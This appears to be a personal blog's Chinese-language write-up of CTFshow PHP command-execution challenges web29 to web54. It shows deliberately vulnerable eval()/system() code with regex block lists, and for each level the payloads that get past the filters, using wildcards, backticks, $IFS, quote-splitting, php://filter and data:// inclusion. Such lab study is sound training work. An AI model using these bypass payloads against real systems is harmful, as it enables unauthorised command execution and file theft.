<!DOCTYPE html>
<html lang="en" dir="ltr" itemscope itemtype="http://schema.org/Article">

  <head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"/>

  <title>CTFshow_WEBrm29_124</title>
  <meta name="author" content="" />
  <meta name="description"
        content="ctfshow web 入门命令执行
参考（抄）：https://www.cnblogs.com/yanwusheng/p/13860578.html，主要是纪录给自己看（侵删）。
web29
&lt;?php
error_reporting(0);
if(isset($_GET[&#39;c&#39;])){
    $c = $_GET[&#39;c&#39;];
    if(!..."/>


  <meta name="generator" content="Hugo 0.78.2" />

  
  <meta itemprop="name" content="CTFshow_WEBrm29_124"/>
  <meta itemprop="description"
        content="ctfshow web 入门命令执行
参考（抄）：https://www.cnblogs.com/yanwusheng/p/13860578.html，主要是纪录给自己看（侵删）。
web29
&lt;?php
error_reporting(0);
if(isset($_GET[&#39;c&#39;])){
    $c = $_GET[&#39;c&#39;];
    if(!..."/>
  <meta itemprop="image"
        content=""/>

  
  <meta property="og:title" content="CTFshow_WEBrm29_124"/>
  <meta property="og:type"
        content="article"/>
  <meta property="og:url" content="https://hzlhy.github.io/ctf/ctfshow_webrm29_124/"/>
  <meta property="og:image"
        content=""/>
  <meta property="og:description"
        content="ctfshow web 入门命令执行
参考（抄）：https://www.cnblogs.com/yanwusheng/p/13860578.html，主要是纪录给自己看（侵删）。
web29
&lt;?php
error_reporting(0);
if(isset($_GET[&#39;c&#39;])){
    $c = $_GET[&#39;c&#39;];
    if(!..."/>
  <meta property="og:site_name" content="LHY&#39;s blogs"/>
  <meta property="article:published_time"
        content="2021-03-25T15:03:09&#43;08:00"/>
  <meta property="article:section" content="CTF"/>
  <meta property="article:tag" content="CTFshow_WEBrm"/>

  
  
  <meta name="twitter:card" content="summary"/>
  <meta name="twitter:site"
        content=""/>
  <meta name="twitter:title" content="CTFshow_WEBrm29_124"/>
  <meta name="twitter:description"
        content="ctfshow web 入门命令执行
参考（抄）：https://www.cnblogs.com/yanwusheng/p/13860578.html，主要是纪录给自己看（侵删）。
web29
&lt;?php
error_reporting(0);
if(isset($_GET[&#39;c&#39;])){
    $c = $_GET[&#39;c&#39;];
    if(!..."/>
  <meta name="twitter:creator"
        content=""/>
  <meta name="twitter:image:src"
        content=""/>

  

  
  <link rel="stylesheet" type="text/css" href="/css/capsule.min.css"/>
  
  

  
  </head>


  <body style="min-height:100vh;display:flex;flex-direction:column">

    <nav class="navbar has-shadow is-white"
     role="navigation" aria-label="main navigation">
  <div class="container">

    <div class="navbar-brand">
      <a class="navbar-item" href="/">
        <div class="title is-4">&nbsp;LHY&#39;s blogs</div>
      </a>

      
      <label role="button" class="navbar-burger has-text-dark"
             aria-label="menu" aria-expanded="false"
             for="navbar-burger-state">
             
        <span aria-hidden="true"></span>
        <span aria-hidden="true"></span>
        <span aria-hidden="true"></span>
      </label>
    </div>

    
    <input type="checkbox" id="navbar-burger-state"/>
                          

    <div class="navbar-menu">
      <div class="navbar-end">
      <a href="/about/"
         class="navbar-item
                ">Abouts</a>
      <a href="/ctf/"
         class="navbar-item
                ">CTFs</a>
      </div>
    </div>

  </div>
</nav>


    <section class="section" style="flex:1">

      
      <div class="container">
        <h1 class="title">CTFshow_WEBrm29_124</h1>
        <p class="subtitle">Mar 25, 2021</p>

        

        
        <div class="content">
          <h2 id="ctfshow-web-入门命令执行">ctfshow web 入门命令执行</h2>
<p>参考（抄）：https://www.cnblogs.com/yanwusheng/p/13860578.html，主要是纪录给自己看（侵删）。</p>
<h3 id="web29">web29</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PHP" data-lang="PHP"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
    $c <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/flag/i&#34;</span>, $c)){
        <span style="color:#66d9ef">eval</span>($c);
    }
    
}<span style="color:#66d9ef">else</span>{
    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
}
</code></pre></div><p><strong>知识点：通配符；</strong>
看到有eval()执行函数
过滤了flag ，可以使用通配符进行绕过。所以payload为：<code>c=system('cat f*');</code>返回的flag进行了隐藏，右</p>
<p>键查看源码即可。</p>
<p>也可以通过文件包含来解决，payload：</p>
<p>先传入<code>?c=echo &quot;lhy&quot;;?&gt;ctfshow &lt;?php system('ls');</code>看到有flag.php文件（前面需要echo &ldquo;lhy&rdquo;;?&gt;是</p>
<p>因为传入c的时候表示一段代码的开始，?&gt;结束后开始执行后面的代码），接下来的为<code>?c=echo &quot;lhy&quot;; ?</code></p>
<p><code>&gt;ctfshow &lt;?php include($_GET['url']);&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<p>补充：对于linux cat 和ca'&rsquo;t ca\t ca&quot;&ldquo;t效果是相同的，这样可以绕过字符的限制，如<code>c=system('ca\t fla\g.php');</code></p>
<h3 id="web30">web30</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>

<span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
    $c <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/flag|system|php/i&#34;</span>, $c)){
        <span style="color:#66d9ef">eval</span>($c);
    }
    
}<span style="color:#66d9ef">else</span>{
    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
}
</code></pre></div><p><strong>知识点：反引号执行系统命令；</strong>
与29相比增加了对命令函数的过滤，命令执行函数有很多，如
<code>system()</code><br>
<code>passthru()</code><br>
<code>exec()</code><br>
<code>shell_exec()</code><br>
<code>popen()</code><br>
<code>proc_open()</code><br>
<code>pcntl_exec()</code><br>
<code>反引号</code><br>
只有system函数是有回显的，其它函数可以通过echo等显示，这里采用反引号绕过
payload1:<code>c=echo `cat f*`;</code><br>
payload2:<code>?c=passthru(&quot;cat f*&quot;);</code><br>
还可以采用文件包含：<br>
payload3:<code>?c=echo &quot;lhy &quot;; include($_GET['url']); ?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<h3 id="web31">web31</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>

<span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
    $c <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;/i&#34;</span>, $c)){
        <span style="color:#66d9ef">eval</span>($c);
    }
    
}<span style="color:#66d9ef">else</span>{
    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
}
</code></pre></div><p><strong>知识点：空格过滤+cat过滤绕过</strong>
这里过滤掉了空格和单引号等等
<strong>在linux空格可以用一下字符代替</strong>：
<code>%09(tab)、$IFS$9、 ${IFS}、$IFS%09(tab)、&lt; 、&lt;&gt;、%20(space)等</code>
<strong>cat被过滤：</strong>
<code>more:一页一页的显示档案内容</code><br>
<code>less:与 more 类似</code><br>
<code>head:查看头几行</code><br>
<code>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</code><br>
<code>tail:查看尾几行</code><br>
<code>nl：显示的时候，顺便输出行号</code><br>
<code>od:以二进制的方式读取档案内容</code><br>
<code>vi:一种编辑器，这个也可以查看</code><br>
<code>vim:一种编辑器，这个也可以查看</code><br>
<code>sort:可以查看</code><br>
<code>uniq:可以查看</code><br>
<code>file -f:报错出具体内容</code></p>
<p>payload1:<code>c=echo(tac%09f*);</code><br>
payload2:<code>c=echo(`more%09f*`);</code><br>
payload3:<code>?c=passthru(&quot;more%09f*&quot;);</code><br>
payload4:<code>c=include($_GET[&quot;url&quot;]);?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</code><br>
直接单引号改为双引号即可</p>
<h3 id="web32">web32</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>

<span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
    $c <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(/i&#34;</span>, $c)){
        <span style="color:#66d9ef">eval</span>($c);
    }
    
}<span style="color:#66d9ef">else</span>{
    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
</code></pre></div><p><strong>知识点：过滤括号绕过</strong>
payload1:<code>?c=include $_GET[&quot;npfs&quot;] ?&gt;&amp;npfs=php://filter/read=convert.base64-encode/resource=flag.php</code><br>
payload2:<code>?c=include $_POST[npfs] ?&gt;npfs=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<h3 id="web33">web33</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>

<span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
    $c <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">/i&#34;</span>, $c)){
        <span style="color:#66d9ef">eval</span>($c);
    }
    
}<span style="color:#66d9ef">else</span>{
    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
}
</code></pre></div><p><strong>知识点：单双引号过滤绕过</strong>
过滤了单双引号，直接用数组作为参数即可绕过
payload1:<code>?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</code>
payload2:<code>?c=include $_POST[a]?&gt;a=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<h3 id="web34">web34</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>

<span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
    $c <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">/i&#34;</span>, $c)){
        <span style="color:#66d9ef">eval</span>($c);
    }
    
}<span style="color:#66d9ef">else</span>{
    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
}
</code></pre></div><p>payload同上</p>
<h3 id="web35">web35</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"> <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">|\&lt;|\=/i&#34;</span>, $c)){
        <span style="color:#66d9ef">eval</span>($c);
    }
</code></pre></div><p>payload同上</p>
<h3 id="web36">web36</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">|\&lt;|\=|\/|
</span><span style="color:#e6db74">[0-9]/i&#34;</span>, $c)){
        <span style="color:#66d9ef">eval</span>($c);
    }
</code></pre></div><p>过滤了数字，同上，只需把数字改为字符就行</p>
<h3 id="web37">web37</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PHP" data-lang="PHP"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>

<span style="color:#75715e">//flag in flag.php
</span><span style="color:#75715e"></span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
    $c <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/flag/i&#34;</span>, $c)){
        <span style="color:#66d9ef">include</span>($c);
        <span style="color:#66d9ef">echo</span> $flag;
    
    }
        
}<span style="color:#66d9ef">else</span>{
    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
}
</code></pre></div><p>这里用了PHP文件包含函数include(),可以利用为协议来读flag</p>
<p>data://，类似php://input，可以让用户来控制输入流，与包含函数结合时，用户输入的data://流会被当做php文件来执行。</p>
<p>payload:<code>?c=data://text/plain,&lt;?php system(&quot;cat f*&quot;);</code></p>
<h3 id="web38">web38</h3>
<h3 id="web39">web39</h3>
<h3 id="web40">web40</h3>
<h3 id="web41">web41</h3>
<h3 id="web42">web42</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>

<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
    $c<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
    <span style="color:#a6e22e">system</span>($c<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span>);
}<span style="color:#66d9ef">else</span>{
    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
}
</code></pre></div><p><strong>知识点：命令分隔</strong>
<code>&gt;/dev/null 2&gt;&amp;1</code>主要意思是不进行回显，所以，若要让命令回显，进行命令分隔即可</p>
<p>;   //分号</p>
<p>|   //只执行后面那条命令</p>
<p>||  //只执行前面那条命令</p>
<p>&amp;   //两条命令都会执行</p>
<p>&amp;&amp;  //两条命令都会执行</p>
<h3 id="web43">web43</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>

<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
    $c<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/\;|cat/i&#34;</span>, $c)){
        <span style="color:#a6e22e">system</span>($c<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span>);
    }
}<span style="color:#66d9ef">else</span>{
    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
}
</code></pre></div><p>过滤了cat和分号，换一种文件读取命令即可：<br>
payload1:<code>?c=tac f*||</code><br>
payload2:<code>?c=c'a't f*||</code><br>
payload3:<code>?c=sort flag.php||</code><br>
查看源码即可</p>
<h3 id="web44">web44</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>

<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
    $c<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/;|cat|flag/i&#34;</span>, $c)){
        <span style="color:#a6e22e">system</span>($c<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span>);
    }
}<span style="color:#66d9ef">else</span>{
    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
}
</code></pre></div><p>多了flag过滤，通配符绕过即可：<br>
payload:<code>?c=c'a't f*||</code></p>
<h3 id="web45">web45</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>

<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
    $c<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/\;|cat|flag| /i&#34;</span>, $c)){
        <span style="color:#a6e22e">system</span>($c<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span>);
    }
}<span style="color:#66d9ef">else</span>{
    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
}
</code></pre></div><p>空格绕过：如 <code>${IFS}、$IFS$9、%09</code></p>
<h3 id="web46">web46</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>

<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
    $c<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/\;|cat|flag| |[0-9]|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">$|\*/i&#34;</span>, $c)){
        <span style="color:#a6e22e">system</span>($c<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span>);
    }
}<span style="color:#66d9ef">else</span>{
    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
}
</code></pre></div><p>过滤了$、数字、*，通配符可以用?代替，空格可以用%09(不算数字)<br>
payload1:<code>?c=sort%09fl?g.php||</code><br>
payload2:<code>?c=tac%09fla??php%09||</code><br>
payload3:<code>?c=awk%09'/f/'%09fla?.php||</code></p>
<h3 id="web47">web47</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>

<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
    $c<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/\;|cat|flag| |[0-9]|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">$|\*|more|less|head|sort|tail/i&#34;</span>, $c)){
        <span style="color:#a6e22e">system</span>($c<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span>);
    }
}<span style="color:#66d9ef">else</span>{
    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
}
</code></pre></div><p>payload: <code>?c=tac%09fl?g.php||</code></p>
<h3 id="web48">web48</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
    $c<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/\;|cat|flag| |[0-9]|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&#34;</span>, $c)){
        <span style="color:#a6e22e">system</span>($c<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span>);
    }
}<span style="color:#66d9ef">else</span>{
    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
}
</code></pre></div><p>payload同上</p>
<h3 id="web49">web49</h3>
<p>过滤了百分号，payload同上</p>
<h3 id="web50">web50</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
    $c<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/\;|cat|flag| |[0-9]|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|</span><span style="color:#ae81ff">\x09</span><span style="color:#e6db74">|</span><span style="color:#ae81ff">\x26</span><span style="color:#e6db74">/i&#34;</span>, $c)){
        <span style="color:#a6e22e">system</span>($c<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span>);
    }
}<span style="color:#66d9ef">else</span>{
    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
}
</code></pre></div><p>过滤了 %09 和 %26
payload=<code>?c=tac&lt;&gt;fl'a'g.php||</code></p>
<h3 id="web51">web51</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
    $c<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/\;|cat|flag| |[0-9]|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|</span><span style="color:#ae81ff">\x09</span><span style="color:#e6db74">|</span><span style="color:#ae81ff">\x26</span><span style="color:#e6db74">/i&#34;</span>, $c)){
        <span style="color:#a6e22e">system</span>($c<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span>);
    }
}<span style="color:#66d9ef">else</span>{
    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
}
</code></pre></div><p>payload=<code>?c=t'a'c&lt;&gt;fl'a'g.php||</code></p>
<h3 id="web52">web52</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
    $c<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|</span><span style="color:#ae81ff">\x09</span><span style="color:#e6db74">|</span><span style="color:#ae81ff">\x26</span><span style="color:#e6db74">|\&gt;|\&lt;/i&#34;</span>, $c)){
        <span style="color:#a6e22e">system</span>($c<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span>);
    }
}<span style="color:#66d9ef">else</span>{
    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
}
</code></pre></div><p>过滤了&lt;&gt;，但是$没有被过滤，使用<code>$ {IFS}</code>浏览器会报错，可以使用<code>$IFS</code>，注意单单这样使用会把$IFS与文件名字及前面的连接在一</p>
<p>起，需要分割，可使用<code>./</code>来进行分开；</p>
<p>先尝试<code>?c=c'a't$IFS./fla\g.php||</code>，查看源码结果出现$flag=&ldquo;flag_here&rdquo;; 使用<code>?c=ls$IFS/%0a</code>(%0a为换行符)查看文件，结果为</p>
<p><code>bin dev etc flag home lib media mnt opt proc root run sbin srv sys tmp usr var</code><br>
payload=<code>?c=c\'a\'t$IFS/fla\g||</code></p>
<h3 id="web53">web53</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
    $c<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|</span><span style="color:#ae81ff">\x09</span><span style="color:#e6db74">|</span><span style="color:#ae81ff">\x26</span><span style="color:#e6db74">|\&gt;|\&lt;/i&#34;</span>, $c)){
        <span style="color:#66d9ef">echo</span>($c);
        $d <span style="color:#f92672">=</span> <span style="color:#a6e22e">system</span>($c);
        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span><span style="color:#f92672">.</span>$d;
    }<span style="color:#66d9ef">else</span>{
        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;no&#39;</span>;
    }
}<span style="color:#66d9ef">else</span>{
    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
}
</code></pre></div><p>payload=<code>?c=c'a't$IFS./fla\g.php</code> ./当前目录下的flag.php</p>
<h3 id="web54">web54</h3>
